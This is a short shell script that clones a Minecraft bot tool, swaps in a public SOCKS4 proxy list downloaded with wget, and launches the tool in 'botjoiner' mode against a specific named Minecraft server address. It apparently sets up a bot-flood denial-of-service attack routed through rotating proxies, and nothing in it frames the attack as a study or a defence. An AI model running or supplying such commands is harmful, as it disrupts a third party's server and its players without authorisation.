git clone https://github.com/dxomg/mcbot
cd mcbot
rm proxies.txt
wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt
mv socks4.txt proxies.txt
java -jar MCBOT.jar de8.plutonodes.net:25344 47 botjoiner 300 40000
